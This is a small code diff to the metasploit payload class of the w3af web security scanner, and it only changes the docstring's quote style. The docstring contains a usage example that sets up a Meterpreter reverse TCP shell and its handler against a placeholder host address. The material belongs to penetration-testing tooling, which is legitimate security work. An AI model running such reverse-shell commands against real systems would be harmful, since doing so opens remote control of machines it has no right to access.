@@ -4,7 +4,7 @@ from w3af.core.controllers.exceptions import w3afException
 
 
 class metasploit(Payload):
-    '''
+    """
     This payload interacts with the metasploit framework.
 
     Usage:
@@ -17,7 +17,7 @@ class metasploit(Payload):
 
     A complete example looks like this:
         linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
-    '''
+    """
     def api_execute(self, msf_args):
         try:
             vd = get_virtual_daemon(self.shell.execute)
